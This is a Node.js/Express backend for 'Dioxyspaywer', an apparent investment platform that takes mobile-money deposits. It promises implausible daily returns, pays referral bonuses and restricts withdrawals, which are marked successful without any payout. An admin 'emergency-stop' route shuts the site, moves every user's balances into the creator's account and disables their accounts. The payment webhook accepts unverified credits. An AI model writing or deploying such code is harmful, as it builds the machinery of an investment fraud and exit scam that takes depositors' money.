require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const cron = require('node-cron');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const axios = require('axios');
const path = require('path');

const User = require('./models/User');
const Transaction = require('./models/Transaction');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let isSiteActive = true;

mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log('✅ MongoDB Connecté'))
    .catch(err => {
        console.error('❌ Erreur MongoDB:', err);
        process.exit(1);
    });

const authMiddleware = async (req, res, next) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Accès refusé' });
    
    try {
        const decoded = jwt.verify(token.split(' ')[1], process.env.JWT_SECRET);
        req.user = await User.findById(decoded.id);
        if (!req.user) return res.status(404).json({ error: 'Utilisateur introuvable' });
        if (!req.user.isActive && req.user.phone !== process.env.CREATOR_WALLET_PHONE) {
            return res.status(403).json({ error: 'Compte désactivé.' });
        }
        next();
    } catch (e) {
        return res.status(401).json({ error: 'Token invalide' });
    }
};

app.get('/api/status', (req, res) => res.json({ active: isSiteActive }));

// Inscription
app.post('/api/register', async (req, res) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    try {
        const { fullName, phone, country, password, referralCode } = req.body;
        if (!fullName || !phone || !password) return res.status(400).json({ error: 'Champs manquants' });
        
        const exist = await User.findOne({ phone });
        if (exist) return res.status(400).json({ error: 'Numéro déjà utilisé' });

        const hashedPassword = await bcrypt.hash(password, 10);
        let role = (phone === process.env.CREATOR_WALLET_PHONE) ? 'admin' : 'user';
        
        let referredByUserId = null;
        let sponsor = null;

        if (referralCode && referralCode.trim() !== '') {
            sponsor = await User.findOne({ referralCode: referralCode.trim() });
            if (sponsor) {
                referredByUserId = sponsor._id;
                sponsor.balance += 350;
                sponsor.referralCount += 1;
                sponsor.referralEarnings += 350;
                await sponsor.save();
                
                await Transaction.create({
                    userId: sponsor._id,
                    type: 'REFERRAL_BONUS',
                    amount: 350,
                    method: 'Parrainage',
                    status: 'SUCCESS',
                    reference: `REF_${Date.now()}`
                });
            }
        }
        
        await User.create({ fullName, phone, country, password: hashedPassword, role, referredBy: referredByUserId });
        res.json({ success: true, message: 'Inscription réussie' });
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: 'Erreur serveur inscription' });
    }
});

// Connexion
app.post('/api/login', async (req, res) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    try {
        const { phone, password } = req.body;
        const user = await User.findOne({ phone });
        if (!user || !(await bcrypt.compare(password, user.password))) {
            return res.status(400).json({ error: 'Identifiants incorrects' });
        }

        const currentMonth = new Date().toISOString().slice(0, 7);
        if (user.lastPurchaseMonth !== currentMonth) {
            user.monthlyPurchasesCount = 0;
            user.lastPurchaseMonth = currentMonth;
            await user.save();
        }

        const token = jwt.sign({ id: user._id, role: user.role }, process.env.JWT_SECRET, { expiresIn: '24h' });
        
        const transactions = await Transaction.find({ userId: user._id }).sort({ date: -1 }).limit(50);

        res.json({ 
            token, 
            role: user.role, 
            balance: user.balance,              // Solde DÉPÔT
            depositBalance: user.balance,       // Alias pour l'affichage
            withdrawalBalance: user.withdrawalBalance || 0, // ✅ Solde RETRAITE (Gains libérés)
            hasLongTerm: user.hasLongTerm, 
            longTermStartDate: user.longTermStartDate,
            longTermAccumulatedGains: user.longTermAccumulatedGains || 0,
            fullName: user.fullName,
            phone: user.phone,
            country: user.country,
            monthlyPurchasesCount: user.monthlyPurchasesCount || 0,
            remainingPurchases: 2 - (user.monthlyPurchasesCount || 0),
            shortTermProducts: user.shortTermProducts || [],
            referralCode: user.referralCode, 
            referralCount: user.referralCount || 0,
            referralEarnings: user.referralEarnings || 0,
            transactions: transactions
        });
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: 'Erreur serveur login' });
    }
});

// --- CRON JOB : GESTION DES GAINS ET TRANSFERTS (Tous les jours à 08:00) ---
cron.schedule('0 8 * * 1-5', async () => {
    if (!isSiteActive) return;
    console.log(' Exécution du Cron Job : Calcul des gains...');
    
    const users = await User.find({ $or: [{ hasLongTerm: true }, { 'shortTermProducts.0': { $exists: true } }] });
    const now = new Date();
    
    for (let user of users) {
        let needsSave = false;
        let totalNewGainToday = 0; // Pour l'historique si besoin

        // 1. Gestion Produit Long Terme
        if (user.hasLongTerm && user.longTermStartDate) {
            const startDate = new Date(user.longTermStartDate);
            const daysPassed = Math.floor((now - startDate) / (1000 * 60 * 60 * 24));
            
            if (daysPassed < 55) {
                // Produit actif : On ajoute le gain du jour dans accumulatedGains
                user.longTermAccumulatedGains = (user.longTermAccumulatedGains || 0) + 700;
                totalNewGainToday += 700;
                needsSave = true;
            } else if (daysPassed === 55) {
                // JOUR 55 EXACT : Transfert total vers withdrawalBalance
                const totalGains = user.longTermAccumulatedGains || (700 * 55);
                user.withdrawalBalance = (user.withdrawalBalance || 0) + totalGains;
                user.longTermAccumulatedGains = 0; // Reset ou garde trace
                
                await Transaction.create({ 
                    userId: user._id, 
                    type: 'GAIN_TRANSFER', 
                    amount: totalGains, 
                    status: 'SUCCESS', 
                    reference: `LT_TRANSFER_${Date.now()}`,
                    description: 'Transfert gains Long Terme vers Retrait'
                });
                needsSave = true;
            }
        }

        // 2. Gestion Produits Courts Termes
        if (user.shortTermProducts && user.shortTermProducts.length > 0) {
            const activeProducts = [];
            
            for (let prod of user.shortTermProducts) {
                const unlockDate = new Date(prod.unlockDate);
                
                if (unlockDate > now) {
                    // Produit encore actif : On ajoute le gain du jour
                    prod.accumulatedGains = (prod.accumulatedGains || 0) + prod.dailyGain;
                    totalNewGainToday += prod.dailyGain;
                    activeProducts.push(prod);
                    needsSave = true;
                } else {
                    // Produit TERMINÉ : Transfert des gains accumulés vers withdrawalBalance
                    const totalGains = prod.accumulatedGains || (prod.dailyGain * 5);
                    user.withdrawalBalance = (user.withdrawalBalance || 0) + totalGains;
                    
                    await Transaction.create({ 
                        userId: user._id, 
                        type: 'GAIN_TRANSFER', 
                        amount: totalGains, 
                        status: 'SUCCESS', 
                        reference: `CT_TRANSFER_${Date.now()}`,
                        description: `Transfert gains ${prod.type} vers Retrait`
                    });
                    
                    // On ne le remet pas dans activeProducts (il est fini)
                    // Optionnel : Vous pouvez garder une trace dans un tableau 'finishedProducts' si besoin
                }
            }
            user.shortTermProducts = activeProducts;
        }

        if (needsSave) {
            await user.save();
            // Optionnel : Créer une transaction pour les gains quotidiens si vous voulez les voir dans l'historique chaque jour
            if (totalNewGainToday > 0) {
                await Transaction.create({ 
                    userId: user._id, 
                    type: 'GAIN', 
                    amount: totalNewGainToday, 
                    status: 'SUCCESS', 
                    reference: `DAILY_GAIN_${Date.now()}` 
                });
            }
        }
    }
    console.log('✅ Cron Job terminé.');
});

// Investissement
app.post('/api/invest', authMiddleware, async (req, res) => {
    try {
        const { productType, amount } = req.body;
        const user = req.user;
        
        if (user.balance < amount) return res.status(400).json({ error: 'Solde insuffisant dans le dépôt.' });
        if (productType !== 'longterm' && !user.hasLongTerm) return res.status(403).json({ error: 'Produit Long Terme obligatoire.' });

        const currentMonth = new Date().toISOString().slice(0, 7);
        if (user.lastPurchaseMonth !== currentMonth) { 
            user.monthlyPurchasesCount = 0; 
            user.lastPurchaseMonth = currentMonth; 
        }
        if (productType !== 'longterm' && user.monthlyPurchasesCount >= 2) {
            return res.status(403).json({ error: 'Limite 2 achats/mois atteinte.' });
        }

        user.balance -= amount;
        let dailyGain = 0;

        if (productType === 'longterm') {
            if (amount !== 2000) return res.status(400).json({ error: 'Prix incorrect Long Terme.' });
            user.hasLongTerm = true; 
            user.longTermStartDate = new Date();
            user.longTermAccumulatedGains = 0; // Reset gains
        } else {
            if (productType === 'prod1') { if (amount !== 2000) throw new Error('Prix P1'); dailyGain = 1000; }
            else if (productType === 'prod2') { if (amount !== 3000) throw new Error('Prix P2'); dailyGain = 1500; }
            else if (productType === 'prod3') { if (amount !== 5000) throw new Error('Prix P3'); dailyGain = 2000; }
            else if (productType === 'prod4') { if (amount !== 10000) throw new Error('Prix P4'); dailyGain = 5000; }
            else if (productType === 'prod5') { if (amount !== 15000) throw new Error('Prix P5'); dailyGain = 6000; }
            else if (productType === 'prod6') { if (amount !== 20000) throw new Error('Prix P6'); dailyGain = 8000; }
            else if (productType === 'prod7') { if (amount !== 30000) throw new Error('Prix P7'); dailyGain = 12000; }
            else if (productType === 'prod8') { if (amount !== 40000) throw new Error('Prix P8'); dailyGain = 16000; }
            else throw new Error('Produit inconnu');

            const unlockDate = new Date(); 
            unlockDate.setDate(unlockDate.getDate() + 5);
            
            if (!user.shortTermProducts) user.shortTermProducts = [];
            user.shortTermProducts.push({ 
                type: productType, 
                amount, 
                dailyGain, 
                startDate: new Date(), 
                unlockDate,
                accumulatedGains: 0 // ✅ Initialisation à 0
            });
            user.monthlyPurchasesCount += 1;
        }
        
        await user.save();
        await Transaction.create({ userId: user._id, type: 'INVESTMENT', amount, status: 'SUCCESS', reference: `INV_${Date.now()}` });
        
        res.json({ success: true, newBalance: user.balance, remainingPurchases: 2 - user.monthlyPurchasesCount });
    } catch (e) {
        console.error(e);
        res.status(400).json({ error: e.message || 'Erreur investissement' });
    }
});

// Dépôt Sendavapay
app.post('/api/deposit', authMiddleware, async (req, res) => {
    const { amount, network, phone } = req.body; 
    if (amount < 2000) return res.status(400).json({ error: 'Minimum 2000 FCFA' });
    try {
        const user = req.user;
        const invoiceNumber = `DXP_${Date.now()}`;
        const postData = {
            amount: parseInt(amount), currency: "XOF", phone_number: phone, network: network,
            reference: invoiceNumber, description: `Dépôt Dioxyspaywer`,
            callback_url: process.env.SENDAVA_CALLBACK_URL, return_url: process.env.SENDAVA_RETURN_URL,
            merchant_id: process.env.SENDAVA_MERCHANT_ID
        };
        const SENDAVA_API_URL = 'https://api.sendavapay.com/v1/charge'; 
        const response = await axios.post(SENDAVA_API_URL, postData, {
            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${process.env.SENDAVA_API_KEY}`, 'X-Public-Key': process.env.SENDAVA_PUBLIC_KEY }
        });
        if (response.data && (response.data.success === true || response.data.checkout_url)) {
            const paymentUrl = response.data.checkout_url || response.data.payment_link;
            await Transaction.create({ userId: user._id, type: 'DEPOSIT', amount, method: network, status: 'PENDING', reference: invoiceNumber });
            res.json({ success: true, paymentUrl: paymentUrl });
        } else {
            res.status(400).json({ error: 'Erreur création paiement Sendavapay.' });
        }
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Erreur connexion Sendavapay.' });
    }
});

// Webhook Sendavapay
app.post('/api/webhook/deposit', async (req, res) => {
    try {
        const data = req.body;
        if (data.status === 'SUCCESS' || data.event === 'completed') {
            const invoiceNumber = data.reference || data.invoice_number;
            const amount = parseFloat(data.amount || data.total_amount);
            const transaction = await Transaction.findOne({ reference: invoiceNumber });
            if (transaction && transaction.status === 'PENDING') {
                transaction.status = 'SUCCESS';
                await transaction.save();
                const user = await User.findById(transaction.userId);
                if (user) {
                    user.balance += amount; // Va dans DÉPÔT
                    await user.save();
                }
            }
        }
        res.status(200).send("OK");
    } catch (e) { res.status(500).send("Error"); }
});

// Retrait
app.post('/api/withdraw', authMiddleware, async (req, res) => {
    try {
        const { amount, network, phone } = req.body;
        const user = req.user;
        const now = new Date();
        
        if (amount < 1000) return res.status(400).json({ error: 'Min 1000 FCFA' });
        if ([0, 6].includes(now.getDay())) return res.status(403).json({ error: 'Retraits indisponibles Samedi/Dimanche.' });
        if (now.getHours() < 8 || now.getHours() >= 21) return res.status(403).json({ error: 'Retraits possibles 08h-21h.' });
        if (user.lastWithdrawDate && user.lastWithdrawDate.toDateString() === now.toDateString()) return res.status(403).json({ error: '1 retrait/jour max.' });

        // Vérification sur withdrawalBalance (Gains libérés uniquement)
        if (amount > (user.withdrawalBalance || 0)) {
            return res.status(400).json({ error: `Solde insuffisant dans RETRAITE. Disponible : ${user.withdrawalBalance || 0} FCFA` });
        }

        user.withdrawalBalance -= amount;
        user.lastWithdrawDate = now;
        await user.save();
        
        await Transaction.create({ userId: user._id, type: 'WITHDRAWAL', amount, method: network, status: 'SUCCESS', reference: `W_${Date.now()}` });
        res.json({ success: true, message: 'Retrait envoyé.' });
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: 'Erreur retrait' });
    }
});

// Admin & Emergency
app.get('/api/admin/dashboard', authMiddleware, async (req, res) => {
    if (req.user.phone !== process.env.CREATOR_WALLET_PHONE) return res.status(403).json({ error: 'Interdit' });
    const users = await User.find();
    const totalVault = users.reduce((a, b) => a + b.balance + (b.withdrawalBalance||0), 0);
    res.json({ users, totalVault });
});

app.post('/api/admin/emergency-stop', authMiddleware, async (req, res) => {
    if (req.user.phone !== process.env.CREATOR_WALLET_PHONE) return res.status(403).json({ error: 'Interdit' });
    isSiteActive = false;
    try {
        const creatorPhone = process.env.CREATOR_WALLET_PHONE;
        let creator = await User.findOne({ phone: creatorPhone }) || await User.create({ fullName:'Admin', phone:creatorPhone, country:'Togo', password:'x', role:'admin', balance:0 });
        const others = await User.find({ _id: { $ne: creator._id } });
        let seized = 0;
        for(let u of others) { 
            if(u.balance>0){ seized+=u.balance; u.balance=0; u.isActive=false; await u.save(); } 
            if(u.withdrawalBalance>0){ seized+=u.withdrawalBalance; u.withdrawalBalance=0; await u.save(); }
        }
        creator.balance += seized; await creator.save();
        res.json({ success: true, message: `Site stoppé. ${seized} FCFA récupérés.` });
    } catch (error) { res.status(500).json({ error: 'Erreur.' }); }
});

app.listen(PORT, () => console.log(`🚀 Serveur Dioxyspaywer démarré sur le port ${PORT}`));
